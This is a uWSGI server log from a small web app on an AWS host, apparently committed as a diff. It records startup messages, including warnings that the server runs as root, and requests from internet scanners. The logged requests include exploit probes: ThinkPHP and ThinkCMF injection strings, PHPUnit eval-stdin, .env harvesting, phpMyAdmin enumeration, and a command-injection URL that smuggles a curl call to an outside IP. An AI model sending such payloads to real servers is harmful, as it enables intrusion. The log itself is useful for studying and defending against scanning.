+[pid: 7716|app: 0|req: 1/1] 1.217.129.235 () {42 vars in 870 bytes} [Wed Jun  2 15:08:15 2021] GET / => generated 7050 bytes in 297 msecs (HTTP/1.1 200) 6 headers in 181 bytes (1 switches on core 0)
+[pid: 7716|app: 0|req: 2/2] 1.217.129.235 () {44 vars in 943 bytes} [Wed Jun  2 15:08:34 2021] GET /category/detail/asd => generated 4807 bytes in 164 msecs (HTTP/1.1 200) 6 headers in 181 bytes (1 switches on core 0)
+[pid: 7716|app: 0|req: 3/3] 1.217.129.235 () {44 vars in 901 bytes} [Wed Jun  2 15:08:44 2021] GET / => generated 7050 bytes in 140 msecs (HTTP/1.1 200) 6 headers in 181 bytes (1 switches on core 0)
+[pid: 7715|app: 0|req: 1/4] 1.217.129.235 () {44 vars in 901 bytes} [Wed Jun  2 15:08:45 2021] GET / => generated 7050 bytes in 287 msecs (HTTP/1.1 200) 6 headers in 181 bytes (1 switches on core 0)
+[pid: 7716|app: 0|req: 4/5] 1.217.129.235 () {44 vars in 901 bytes} [Wed Jun  2 15:08:45 2021] GET / => generated 7050 bytes in 132 msecs (HTTP/1.1 200) 6 headers in 181 bytes (1 switches on core 0)
+*** Starting uWSGI 2.0.19.1 (64bit) on [Wed Jun  2 06:09:41 2021] ***
+compiled with version: 7.3.1 20180712 (Red Hat 7.3.1-12) on 30 May 2021 06:08:58
+os: Linux-4.14.232-176.381.amzn2.x86_64 #1 SMP Wed May 19 00:31:54 UTC 2021
+nodename: was1
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /home/ec2-user
+detected binary path: /home/ec2-user/venv_AWS_Web/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /home/ec2-user/AWS_Web
+your memory page size is 4096 bytes
+detected max file descriptor number: 65535
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to UNIX address /home/ec2-user/AWS_Web/myticket.sock fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.7.9 (default, Apr 30 2021, 20:11:56)  [GCC 7.3.1 20180712 (Red Hat 7.3.1-12)]
+PEP 405 virtualenv detected: /home/ec2-user/venv_AWS_Web
+Set PythonHome to /home/ec2-user/venv_AWS_Web
+Python main interpreter initialized at 0xc79330
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 802120 bytes (783 KB) for 10 cores
+*** Operational MODE: preforking ***
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0xc79330 pid: 7829 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+spawned uWSGI master process (pid: 7829)
+spawned uWSGI worker 1 (pid: 7832, cores: 1)
+spawned uWSGI worker 2 (pid: 7833, cores: 1)
+spawned uWSGI worker 3 (pid: 7834, cores: 1)
+spawned uWSGI worker 4 (pid: 7835, cores: 1)
+spawned uWSGI worker 5 (pid: 7836, cores: 1)
+spawned uWSGI worker 6 (pid: 7837, cores: 1)
+spawned uWSGI worker 7 (pid: 7838, cores: 1)
+spawned uWSGI worker 8 (pid: 7839, cores: 1)
+spawned uWSGI worker 9 (pid: 7840, cores: 1)
+spawned uWSGI worker 10 (pid: 7841, cores: 1)
+[pid: 7839|app: 0|req: 1/1] 209.17.97.122 () {30 vars in 398 bytes} [Wed Jun  2 15:35:16 2021] GET / => generated 6956 bytes in 251 msecs (HTTP/1.1 200) 6 headers in 181 bytes (1 switches on core 0)
+[pid: 7839|app: 0|req: 2/2] 116.68.111.134 () {38 vars in 493 bytes} [Wed Jun  2 17:06:15 2021] POST /GponForm/diag_Form?images/ => generated 179 bytes in 70 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
+[pid: 7839|app: 0|req: 3/3] 45.146.164.125 () {34 vars in 544 bytes} [Wed Jun  2 20:52:42 2021] GET /solr/admin/info/system?wt=json => generated 179 bytes in 86 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
+[pid: 7835|app: 0|req: 1/4] 45.146.164.125 () {38 vars in 598 bytes} [Wed Jun  2 20:52:42 2021] POST /api/jsonws/invoke => generated 179 bytes in 137 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
+[pid: 7839|app: 0|req: 4/5] 45.146.164.125 () {36 vars in 612 bytes} [Wed Jun  2 20:52:43 2021] GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php => generated 179 bytes in 52 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
+[pid: 7833|app: 0|req: 1/6] 45.146.164.125 () {38 vars in 700 bytes} [Wed Jun  2 20:52:43 2021] POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php => generated 179 bytes in 113 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
+[pid: 7839|app: 0|req: 5/7] 45.146.164.125 () {36 vars in 641 bytes} [Wed Jun  2 20:52:43 2021] GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> => generated 6956 bytes in 118 msecs (HTTP/1.1 200) 6 headers in 181 bytes (1 switches on core 0)
+[pid: 7840|app: 0|req: 1/8] 45.146.164.125 () {34 vars in 708 bytes} [Wed Jun  2 20:52:43 2021] GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 => generated 179 bytes in 134 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
+[pid: 7839|app: 0|req: 6/9] 45.146.164.125 () {34 vars in 544 bytes} [Wed Jun  2 20:52:44 2021] GET /?XDEBUG_SESSION_START=phpstorm => generated 6956 bytes in 66 msecs (HTTP/1.1 200) 6 headers in 181 bytes (1 switches on core 0)
+[pid: 7840|app: 0|req: 2/10] 45.146.164.125 () {34 vars in 501 bytes} [Wed Jun  2 20:52:44 2021] GET /console/ => generated 179 bytes in 54 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
+[pid: 7839|app: 0|req: 7/11] 45.146.164.125 () {38 vars in 624 bytes} [Wed Jun  2 20:52:45 2021] POST /Autodiscover/Autodiscover.xml => generated 179 bytes in 54 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
+[pid: 7836|app: 0|req: 1/12] 45.146.164.125 () {36 vars in 590 bytes} [Wed Jun  2 20:52:45 2021] GET /_ignition/execute-solution => generated 179 bytes in 112 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
+[pid: 7839|app: 0|req: 8/13] 45.146.164.125 () {34 vars in 575 bytes} [Wed Jun  2 20:52:46 2021] GET /wp-content/plugins/wp-file-manager/readme.txt => generated 179 bytes in 59 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
+[pid: 7839|app: 0|req: 9/14] 80.82.77.33 () {34 vars in 522 bytes} [Wed Jun  2 21:42:51 2021] GET / => generated 6956 bytes in 105 msecs (HTTP/1.1 200) 6 headers in 181 bytes (1 switches on core 0)
+[pid: 7840|app: 0|req: 3/15] 80.82.77.33 () {30 vars in 345 bytes} [Wed Jun  2 21:42:51 2021] GET /robots.txt => generated 179 bytes in 85 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
+[pid: 7839|app: 0|req: 10/16] 80.82.77.33 () {30 vars in 347 bytes} [Wed Jun  2 21:42:52 2021] GET /sitemap.xml => generated 179 bytes in 59 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
+[pid: 7834|app: 0|req: 1/17] 80.82.77.33 () {30 vars in 373 bytes} [Wed Jun  2 21:42:52 2021] GET /.well-known/security.txt => generated 179 bytes in 122 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
+[pid: 7839|app: 0|req: 11/18] 80.82.77.33 () {36 vars in 500 bytes} [Wed Jun  2 21:42:53 2021] GET /favicon.ico => generated 179 bytes in 56 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
+[pid: 7839|app: 0|req: 12/19] 222.77.181.28 () {34 vars in 487 bytes} [Wed Jun  2 21:43:05 2021] GET /TP/public/index.php => generated 179 bytes in 56 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
+[pid: 7834|app: 0|req: 2/20] 222.77.181.28 () {34 vars in 473 bytes} [Wed Jun  2 21:43:05 2021] GET /TP/index.php => generated 179 bytes in 51 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
+[pid: 7839|app: 0|req: 13/21] 222.77.181.28 () {34 vars in 510 bytes} [Wed Jun  2 21:43:05 2021] GET /thinkphp/html/public/index.php => generated 179 bytes in 60 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
+[pid: 7836|app: 0|req: 2/22] 222.77.181.28 () {34 vars in 492 bytes} [Wed Jun  2 21:43:06 2021] GET /html/public/index.php => generated 179 bytes in 67 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
+[pid: 7839|app: 0|req: 14/23] 222.77.181.28 () {34 vars in 482 bytes} [Wed Jun  2 21:43:06 2021] GET /public/index.php => generated 179 bytes in 52 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
+[pid: 7840|app: 0|req: 4/24] 222.77.181.28 () {34 vars in 498 bytes} [Wed Jun  2 21:43:06 2021] GET /TP/html/public/index.php => generated 179 bytes in 54 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
+[pid: 7834|app: 0|req: 3/25] 222.77.181.28 () {34 vars in 470 bytes} [Wed Jun  2 21:43:06 2021] GET /elrekt.php => generated 179 bytes in 69 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
+[pid: 7841|app: 0|req: 1/26] 222.77.181.28 () {34 vars in 468 bytes} [Wed Jun  2 21:43:07 2021] GET /index.php => generated 179 bytes in 110 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
+[pid: 7839|app: 0|req: 15/27] 222.77.181.28 () {34 vars in 453 bytes} [Wed Jun  2 21:43:07 2021] GET / => generated 6956 bytes in 83 msecs (HTTP/1.1 200) 6 headers in 181 bytes (1 switches on core 0)
+[pid: 7839|app: 0|req: 16/28] 72.167.39.206 () {36 vars in 511 bytes} [Wed Jun  2 22:03:09 2021] GET /.env => generated 179 bytes in 199 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
+[pid: 7840|app: 0|req: 5/29] 72.167.39.206 () {40 vars in 618 bytes} [Wed Jun  2 22:03:10 2021] POST / => generated 1529 bytes in 68 msecs (HTTP/1.1 403) 5 headers in 159 bytes (1 switches on core 0)
+[pid: 7839|app: 0|req: 17/30] 193.142.203.227 () {36 vars in 552 bytes} [Wed Jun  2 22:07:39 2021] GET / => generated 6956 bytes in 96 msecs (HTTP/1.1 200) 6 headers in 181 bytes (1 switches on core 0)
+[pid: 7840|app: 0|req: 6/31] 193.142.203.227 () {38 vars in 599 bytes} [Wed Jun  2 22:07:40 2021] GET /HNAP1/ => generated 179 bytes in 90 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
+[pid: 7839|app: 0|req: 18/32] 211.38.102.148 () {38 vars in 518 bytes} [Wed Jun  2 22:55:17 2021] GET / => generated 6956 bytes in 126 msecs (HTTP/1.0 200) 6 headers in 181 bytes (1 switches on core 0)
+[pid: 7839|app: 0|req: 19/33] 40.117.136.41 () {36 vars in 511 bytes} [Wed Jun  2 23:05:49 2021] GET /.env => generated 179 bytes in 92 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
+[pid: 7839|app: 0|req: 20/34] 40.117.136.41 () {40 vars in 618 bytes} [Wed Jun  2 23:05:50 2021] POST / => generated 1529 bytes in 55 msecs (HTTP/1.1 403) 5 headers in 159 bytes (1 switches on core 0)
+[pid: 7839|app: 0|req: 21/35] 216.218.206.66 () {28 vars in 296 bytes} [Wed Jun  2 23:40:15 2021] GET / => generated 6956 bytes in 99 msecs (HTTP/1.1 200) 6 headers in 181 bytes (1 switches on core 0)
+[pid: 7839|app: 0|req: 22/36] 23.251.102.74 () {34 vars in 475 bytes} [Thu Jun  3 00:58:58 2021] GET / => generated 6956 bytes in 116 msecs (HTTP/1.1 200) 6 headers in 181 bytes (1 switches on core 0)
+[pid: 7839|app: 0|req: 23/37] 91.198.77.24 () {34 vars in 411 bytes} [Thu Jun  3 01:08:02 2021] GET /admin/login?debug=1 => generated 0 bytes in 90 msecs (HTTP/1.1 302) 9 headers in 348 bytes (1 switches on core 0)
+[pid: 7840|app: 0|req: 7/38] 91.198.77.24 () {34 vars in 389 bytes} [Thu Jun  3 01:08:03 2021] GET /?debug=1 => generated 6956 bytes in 227 msecs (HTTP/1.1 200) 6 headers in 181 bytes (1 switches on core 0)
+[pid: 7839|app: 0|req: 24/39] 51.15.139.19 () {38 vars in 474 bytes} [Thu Jun  3 01:24:48 2021] GET / => generated 6956 bytes in 98 msecs (HTTP/1.1 200) 6 headers in 181 bytes (1 switches on core 0)
+[pid: 7839|app: 0|req: 25/40] 51.15.139.19 () {38 vars in 474 bytes} [Thu Jun  3 01:24:48 2021] GET / => generated 6956 bytes in 70 msecs (HTTP/1.1 200) 6 headers in 181 bytes (1 switches on core 0)
+[pid: 7840|app: 0|req: 8/41] 51.15.139.19 () {38 vars in 473 bytes} [Thu Jun  3 01:24:49 2021] GET / => generated 6956 bytes in 95 msecs (HTTP/1.1 200) 6 headers in 181 bytes (1 switches on core 0)
+[pid: 7839|app: 0|req: 26/42] 51.15.139.19 () {38 vars in 474 bytes} [Thu Jun  3 01:24:49 2021] GET / => generated 6956 bytes in 70 msecs (HTTP/1.1 200) 6 headers in 181 bytes (1 switches on core 0)
+[pid: 7840|app: 0|req: 9/43] 51.15.139.19 () {38 vars in 474 bytes} [Thu Jun  3 01:24:49 2021] GET / => generated 6956 bytes in 74 msecs (HTTP/1.1 200) 6 headers in 181 bytes (1 switches on core 0)
+[pid: 7839|app: 0|req: 27/44] 51.15.139.19 () {38 vars in 474 bytes} [Thu Jun  3 01:24:50 2021] GET / => generated 6956 bytes in 74 msecs (HTTP/1.1 200) 6 headers in 181 bytes (1 switches on core 0)
+[pid: 7840|app: 0|req: 10/45] 51.15.139.19 () {38 vars in 474 bytes} [Thu Jun  3 01:24:50 2021] GET / => generated 6956 bytes in 74 msecs (HTTP/1.1 200) 6 headers in 181 bytes (1 switches on core 0)
+[pid: 7839|app: 0|req: 28/46] 51.15.139.19 () {38 vars in 474 bytes} [Thu Jun  3 01:24:50 2021] GET / => generated 6956 bytes in 81 msecs (HTTP/1.1 200) 6 headers in 181 bytes (1 switches on core 0)
+[pid: 7840|app: 0|req: 11/47] 51.15.139.19 () {38 vars in 474 bytes} [Thu Jun  3 01:24:50 2021] GET / => generated 6956 bytes in 67 msecs (HTTP/1.1 200) 6 headers in 181 bytes (1 switches on core 0)
+[pid: 7839|app: 0|req: 29/48] 13.92.37.63 () {36 vars in 509 bytes} [Thu Jun  3 01:25:12 2021] GET /.env => generated 179 bytes in 56 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
+[pid: 7837|app: 0|req: 1/49] 13.92.37.63 () {40 vars in 616 bytes} [Thu Jun  3 01:25:13 2021] POST / => generated 1529 bytes in 121 msecs (HTTP/1.1 403) 5 headers in 159 bytes (1 switches on core 0)
+[pid: 7839|app: 0|req: 30/50] 183.188.166.80 () {38 vars in 493 bytes} [Thu Jun  3 02:22:58 2021] POST /GponForm/diag_Form?images/ => generated 179 bytes in 73 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
+[pid: 7839|app: 0|req: 31/51] 77.247.108.77 () {32 vars in 535 bytes} [Thu Jun  3 03:15:09 2021] GET /maint/modules/home/index.php?lang=english|curl%20161.97.77.135/checkTrix00%20-O%20/dev/null&||x => generated 179 bytes in 91 msecs (HTTP/1.0 404) 5 headers in 158 bytes (1 switches on core 0)
+[pid: 7839|app: 0|req: 32/52] 2.230.144.31 () {34 vars in 533 bytes} [Thu Jun  3 04:36:05 2021] GET /PMA2014/index.php?lang=en => generated 179 bytes in 76 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
+[pid: 7839|app: 0|req: 33/53] 2.230.144.31 () {34 vars in 547 bytes} [Thu Jun  3 04:36:05 2021] GET /phpmyadmin2014/index.php?lang=en => generated 179 bytes in 53 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
+[pid: 7836|app: 0|req: 3/54] 2.230.144.31 () {34 vars in 539 bytes} [Thu Jun  3 04:36:06 2021] GET /phpMyAdmin/index.php?lang=en => generated 179 bytes in 74 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
+[pid: 7839|app: 0|req: 34/55] 2.230.144.31 () {34 vars in 539 bytes} [Thu Jun  3 04:36:07 2021] GET /sqlmanager/index.php?lang=en => generated 179 bytes in 49 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
+[pid: 7835|app: 0|req: 2/56] 2.230.144.31 () {34 vars in 533 bytes} [Thu Jun  3 04:36:07 2021] GET /MyAdmin/index.php?lang=en => generated 179 bytes in 84 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
+[pid: 7839|app: 0|req: 35/57] 2.230.144.31 () {34 vars in 533 bytes} [Thu Jun  3 04:36:08 2021] GET /pma2012/index.php?lang=en => generated 179 bytes in 48 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
+[pid: 7837|app: 0|req: 2/58] 2.230.144.31 () {34 vars in 533 bytes} [Thu Jun  3 04:36:09 2021] GET /pma2018/index.php?lang=en => generated 179 bytes in 81 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
+[pid: 7839|app: 0|req: 36/59] 2.230.144.31 () {34 vars in 541 bytes} [Thu Jun  3 04:36:09 2021] GET /db/db-admin/index.php?lang=en => generated 179 bytes in 58 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
+[pid: 7840|app: 0|req: 12/60] 2.230.144.31 () {34 vars in 529 bytes} [Thu Jun  3 04:36:10 2021] GET /mysql/index.php?lang=en => generated 179 bytes in 92 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
+[pid: 7839|app: 0|req: 37/61] 2.230.144.31 () {34 vars in 547 bytes} [Thu Jun  3 04:36:11 2021] GET /phpmyadmin2014/index.php?lang=en => generated 179 bytes in 52 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
+[pid: 7833|app: 0|req: 2/62] 2.230.144.31 () {34 vars in 533 bytes} [Thu Jun  3 04:36:11 2021] GET /PMA2013/index.php?lang=en => generated 179 bytes in 67 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
+[pid: 7839|app: 0|req: 38/63] 2.230.144.31 () {34 vars in 541 bytes} [Thu Jun  3 04:36:12 2021] GET /_phpMyAdmin/index.php?lang=en => generated 179 bytes in 52 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
+[pid: 7833|app: 0|req: 3/64] 2.230.144.31 () {34 vars in 533 bytes} [Thu Jun  3 04:36:13 2021] GET /pma2013/index.php?lang=en => generated 179 bytes in 46 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
+[pid: 7839|app: 0|req: 39/65] 2.230.144.31 () {34 vars in 543 bytes} [Thu Jun  3 04:36:13 2021] GET /mysqlmanager/index.php?lang=en => generated 179 bytes in 56 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
+[pid: 7835|app: 0|req: 3/66] 2.230.144.31 () {34 vars in 533 bytes} [Thu Jun  3 04:36:14 2021] GET /PMA2012/index.php?lang=en => generated 179 bytes in 54 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
+[pid: 7839|app: 0|req: 40/67] 2.230.144.31 () {34 vars in 541 bytes} [Thu Jun  3 04:36:14 2021] GET /sql/myadmin/index.php?lang=en => generated 179 bytes in 49 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
+[pid: 7836|app: 0|req: 4/68] 2.230.144.31 () {34 vars in 533 bytes} [Thu Jun  3 04:36:15 2021] GET /pma2018/index.php?lang=en => generated 179 bytes in 63 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
+[pid: 7839|app: 0|req: 41/69] 2.230.144.31 () {34 vars in 549 bytes} [Thu Jun  3 04:36:16 2021] GET /sql/phpMyAdmin2/index.php?lang=en => generated 179 bytes in 61 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
+[pid: 7839|app: 0|req: 42/70] 2.230.144.31 () {34 vars in 543 bytes} [Thu Jun  3 04:36:16 2021] GET /mysqlmanager/index.php?lang=en => generated 179 bytes in 54 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
+[pid: 7837|app: 0|req: 3/71] 2.230.144.31 () {34 vars in 533 bytes} [Thu Jun  3 04:36:17 2021] GET /sql/sql/index.php?lang=en => generated 179 bytes in 65 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
+[pid: 7835|app: 0|req: 4/72] 2.230.144.31 () {34 vars in 535 bytes} [Thu Jun  3 04:36:18 2021] GET /mysql/db/index.php?lang=en => generated 179 bytes in 66 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
+[pid: 7840|app: 0|req: 13/73] 2.230.144.31 () {34 vars in 533 bytes} [Thu Jun  3 04:36:19 2021] GET /PMA2011/index.php?lang=en => generated 179 bytes in 55 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
+[pid: 7839|app: 0|req: 43/74] 2.230.144.31 () {34 vars in 547 bytes} [Thu Jun  3 04:36:19 2021] GET /phpmyadmin2019/index.php?lang=en => generated 179 bytes in 47 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
+[pid: 7834|app: 0|req: 4/75] 2.230.144.31 () {34 vars in 533 bytes} [Thu Jun  3 04:36:20 2021] GET /PMA2013/index.php?lang=en => generated 179 bytes in 77 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
+[pid: 7839|app: 0|req: 44/76] 2.230.144.31 () {34 vars in 541 bytes} [Thu Jun  3 04:36:21 2021] GET /mysql/admin/index.php?lang=en => generated 179 bytes in 56 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
+[pid: 7840|app: 0|req: 14/77] 2.230.144.31 () {34 vars in 549 bytes} [Thu Jun  3 04:36:21 2021] GET /sql/phpMyAdmin2/index.php?lang=en => generated 179 bytes in 58 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
+[pid: 7839|app: 0|req: 45/78] 2.230.144.31 () {34 vars in 533 bytes} [Thu Jun  3 04:36:22 2021] GET /PMA2014/index.php?lang=en => generated 179 bytes in 58 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
+[pid: 7832|app: 0|req: 1/79] 2.230.144.31 () {34 vars in 535 bytes} [Thu Jun  3 04:36:22 2021] GET /database/index.php?lang=en => generated 179 bytes in 123 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
+[pid: 7839|app: 0|req: 46/80] 2.230.144.31 () {34 vars in 539 bytes} [Thu Jun  3 04:36:23 2021] GET /db/dbadmin/index.php?lang=en => generated 179 bytes in 52 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
+[pid: 7839|app: 0|req: 47/81] 2.230.144.31 () {34 vars in 529 bytes} [Thu Jun  3 04:36:24 2021] GET /admin/index.php?lang=en => generated 0 bytes in 49 msecs (HTTP/1.1 302) 9 headers in 352 bytes (1 switches on core 0)
+[pid: 7839|app: 0|req: 48/82] 51.141.162.191 () {36 vars in 511 bytes} [Thu Jun  3 04:40:48 2021] GET / => generated 6956 bytes in 124 msecs (HTTP/1.1 200) 6 headers in 181 bytes (1 switches on core 0)
+[pid: 7839|app: 0|req: 49/83] 198.211.99.128 () {40 vars in 660 bytes} [Thu Jun  3 05:05:42 2021] GET /config/getuser?index=0 => generated 179 bytes in 76 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
+[pid: 7839|app: 0|req: 50/84] 89.40.73.220 () {36 vars in 503 bytes} [Thu Jun  3 05:57:48 2021] GET / => generated 6956 bytes in 89 msecs (HTTP/1.1 200) 6 headers in 181 bytes (1 switches on core 0)
+[pid: 7839|app: 0|req: 51/85] 209.17.96.114 () {30 vars in 389 bytes} [Thu Jun  3 06:31:53 2021] GET / => generated 6956 bytes in 96 msecs (HTTP/1.0 200) 6 headers in 181 bytes (1 switches on core 0)
+[pid: 7839|app: 0|req: 52/86] 84.252.140.245 () {36 vars in 512 bytes} [Thu Jun  3 06:47:45 2021] GET /.env => generated 179 bytes in 84 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
+[pid: 7840|app: 0|req: 15/87] 84.252.140.245 () {40 vars in 619 bytes} [Thu Jun  3 06:47:45 2021] POST / => generated 1529 bytes in 68 msecs (HTTP/1.1 403) 5 headers in 159 bytes (1 switches on core 0)
+[pid: 7839|app: 0|req: 53/88] 128.14.134.134 () {34 vars in 486 bytes} [Thu Jun  3 07:51:15 2021] GET /solr/ => generated 179 bytes in 81 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
+[pid: 7839|app: 0|req: 54/89] 141.98.10.223 () {30 vars in 324 bytes} [Thu Jun  3 08:33:21 2021] GET / => generated 6956 bytes in 99 msecs (HTTP/1.1 200) 6 headers in 181 bytes (1 switches on core 0)
+[pid: 7839|app: 0|req: 55/90] 68.183.19.106 () {36 vars in 801 bytes} [Thu Jun  3 09:18:50 2021] GET /images/Nxrs4tAtO/HCw4_2FQ7o69dmQEodXU/_2Fua56jJgWqt8tN1Tx/0M9Tus5G1nAOe_2BJflcrm/2nz3T7AxG_2Fd/YnZ7Cn6A/zq1HlKYZhiFyQLgflmvIbb1/yQL2MK3UaK/00uQsiMnxrcs4C9gN/xpGuwRLuq6tH/7YwEr.avi => generated 179 bytes in 70 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
+[pid: 7839|app: 0|req: 56/91] 54.214.208.23 () {36 vars in 511 bytes} [Thu Jun  3 09:50:30 2021] GET /.env => generated 179 bytes in 73 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
+[pid: 7840|app: 0|req: 16/92] 54.214.208.23 () {40 vars in 618 bytes} [Thu Jun  3 09:50:31 2021] POST / => generated 1529 bytes in 76 msecs (HTTP/1.1 403) 5 headers in 159 bytes (1 switches on core 0)
+[pid: 7839|app: 0|req: 57/93] 209.17.96.98 () {30 vars in 397 bytes} [Thu Jun  3 10:04:34 2021] GET / => generated 6956 bytes in 117 msecs (HTTP/1.1 200) 6 headers in 181 bytes (1 switches on core 0)
+[pid: 7839|app: 0|req: 58/94] 162.62.123.46 () {30 vars in 319 bytes} [Thu Jun  3 11:02:58 2021] GET / => generated 6956 bytes in 92 msecs (HTTP/1.0 200) 6 headers in 181 bytes (1 switches on core 0)
+[pid: 7839|app: 0|req: 59/95] 167.99.222.78 () {32 vars in 452 bytes} [Thu Jun  3 11:43:33 2021] GET / => generated 6956 bytes in 100 msecs (HTTP/1.1 200) 6 headers in 181 bytes (1 switches on core 0)
+[pid: 7839|app: 0|req: 60/96] 1.217.129.235 () {42 vars in 826 bytes} [Thu Jun  3 14:26:21 2021] GET / => generated 10409 bytes in 116 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 7839|app: 0|req: 61/97] 1.217.129.235 () {42 vars in 777 bytes} [Thu Jun  3 14:26:23 2021] GET /favicon.ico => generated 179 bytes in 49 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
+...brutally killing workers...
+worker 1 buried after 1 seconds
+worker 2 buried after 1 seconds
+worker 3 buried after 1 seconds
+worker 4 buried after 1 seconds
+worker 5 buried after 1 seconds
+worker 6 buried after 1 seconds
+worker 7 buried after 1 seconds
+worker 8 buried after 1 seconds
+worker 9 buried after 1 seconds
+worker 10 buried after 1 seconds
+binary reloading uWSGI...
+chdir() to /home/ec2-user
+closing all non-uwsgi socket fds > 2 (max_fd = 65535)...
+found fd 3 mapped to socket 0 (/home/ec2-user/AWS_Web/myticket.sock)
+running /home/ec2-user/venv_AWS_Web/bin/uwsgi
+[uWSGI] getting INI configuration from AWS_Web/myticket_uwsgi.ini
+*** Starting uWSGI 2.0.19.1 (64bit) on [Thu Jun  3 14:26:40 2021] ***
+compiled with version: 7.3.1 20180712 (Red Hat 7.3.1-12) on 30 May 2021 06:08:58
+os: Linux-4.14.232-176.381.amzn2.x86_64 #1 SMP Wed May 19 00:31:54 UTC 2021
+nodename: was1
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 1
+current working directory: /home/ec2-user
+detected binary path: /home/ec2-user/venv_AWS_Web/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /home/ec2-user/AWS_Web
+your memory page size is 4096 bytes
+detected max file descriptor number: 65535
